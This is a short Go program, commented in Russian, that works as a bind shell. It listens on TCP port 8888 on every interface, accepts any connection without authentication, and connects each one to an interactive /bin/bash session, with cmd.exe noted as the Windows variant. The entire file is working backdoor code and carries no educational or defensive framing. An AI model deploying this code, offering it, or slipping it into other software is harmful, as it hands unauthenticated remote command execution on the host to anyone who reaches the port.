package main

import (
	"io"
	"log/slog"
	"net"
	"os/exec"
)

func handle(con net.Conn) {
	cmd := exec.Command("/bin/bash", "-i")
	// если вдруг нужна windows exec.Command("cmd.exe", "-i")
	rp, wp := io.Pipe()
	cmd.Stdin = con
	cmd.Stdout = wp
	go io.Copy(con, rp)
	cmd.Run()
	con.Close()
}

func main() {
	//обработка локальных подключений
	listener, err := net.Listen("tcp", ":8888")
	if err != nil {
		slog.Info("error to bind to port")
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			slog.Info("Unable to accept connection")
		}
		go handle(conn)
	}

}
